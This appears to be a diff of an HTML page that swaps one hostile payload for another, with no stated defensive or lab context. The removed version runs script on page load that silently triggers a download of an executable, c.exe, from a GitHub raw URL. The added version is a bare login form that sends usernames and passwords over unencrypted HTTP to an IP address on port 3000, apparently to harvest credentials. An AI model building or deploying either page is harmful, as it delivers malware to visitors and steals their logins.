@@ -3,26 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Download</title>
-    <script>
-        window.onload = function() {
-            // Create a link element
-            var link = document.createElement('a');
-            link.href = 'https://github.com/Fhchcjcjcjcjvkkvk/Fff/raw/refs/heads/main/c.exe';
-            link.download = 'c.exe'; // Optionally specify a filename
-            document.body.appendChild(link);
-            link.click();  // Trigger the download
-            document.body.removeChild(link);  // Remove the link after triggering download
-
-            // Display the message
-            var message = document.createElement('p');
-            message.innerHTML = 'Thanks for downloading...';
-            document.body.appendChild(message);
-        }
-    </script>
+    <title>Login Form</title>
 </head>
 <body>
-    <!-- The content is dynamically generated via JavaScript -->
+    <h1>Login</h1>
+    <!-- HTML form to send credentials -->
+    <form action="http://10.0.1.33:3000" method="POST">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+        <br>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+        <br>
+        <button type="submit">Submit</button>
+    </form>
 </body>
 </html>
-
